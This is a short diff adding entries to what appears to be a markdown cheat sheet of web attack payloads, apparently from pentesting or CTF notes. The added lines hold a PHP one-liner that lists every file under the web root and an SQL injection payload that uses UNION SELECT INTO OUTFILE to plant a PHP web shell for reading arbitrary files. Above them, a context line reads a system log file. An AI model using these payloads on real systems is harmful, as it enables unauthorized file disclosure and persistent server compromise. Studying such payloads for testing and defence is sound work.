@@ -22,6 +22,9 @@ echo readfile('/var/log/faillog'); // Reads file
 ?>
 ```
 
+- `<?php $t = new RecursiveDirectoryIterator("/var/www/html");foreach(new RecursiveIteratorIterator($t) as $file =>$key) { echo $file."<br/>"; } ?>` : Iterating the directory
+- `' UNION SELECT null,'04-01-2099', '<?php show_source($_GET["file"]); ?>' into outfile '/var/www/html/kaospilot1.php' #` : Uploading a php script
+
 
 ## Common tools¶
 
